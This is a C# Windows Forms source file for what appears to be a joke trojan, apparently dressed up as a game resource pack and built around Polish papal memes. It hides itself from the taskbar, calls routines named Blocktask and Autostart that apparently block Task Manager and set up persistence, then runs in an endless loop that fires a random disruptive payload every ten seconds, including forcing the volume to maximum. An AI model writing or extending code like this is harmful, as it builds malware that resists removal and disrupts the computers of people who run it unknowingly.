using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;
//Watykańczyk
namespace Resourcepackv1
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr lParam);
        public const int APPCOMMAND_VOLUME_UP = 0xA00;
        public const int WM_APPCOMMAND = 0x319;

        public Form1()
        {
            SoundPlayer player = new SoundPlayer(Properties.Resources.BARKA);
            player.PlayLooping();
            this.BackgroundImage = Properties.Resources.jp2disco;
            var timer = new System.Windows.Forms.Timer();
            timer.Interval = 1000;
            timer.Tick += new EventHandler(timer_Tick);
            timer.Start();

            Random random = new Random();
            int x = random.Next(0,1270);
            int y = random.Next(0, 920);

            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;
            InitializeComponent();
            RandomPayload();
        }
        void timer_Tick(object sender, EventArgs e)
        { 
            List<Bitmap> lisimage = new List<Bitmap>();
            lisimage.Add(Properties.Resources.jp2disco);
            var indexbackimage = DateTime.Now.Second % lisimage.Count;
            this.BackgroundImage = lisimage[indexbackimage];
        }
        public void RandomPayload()
        {
            Payload payload = new Payload();
            payload.Blocktask();
            payload.Autostart();
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 7);
                switch (x)
                {
                    case 1:
                        payload.Payload1();
                        break;
                    case 2:
                        payload.Payload2();
                        break;
                    case 3:
                        payload.Payload3();
                        break;
                    case 4:
                        payload.Kremowka();
                        break;
                    case 5:
                        Vol();
                        break;
                    case 6:
                        payload.Payload4();
                        break;
                }
                Thread.Sleep(10000);
            }
        }
        private void Vol()
        {
            for(int i = 0; i < 100; i++)
            {
                SendMessage(this.Handle, WM_APPCOMMAND, this.Handle, (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
        
    }
}
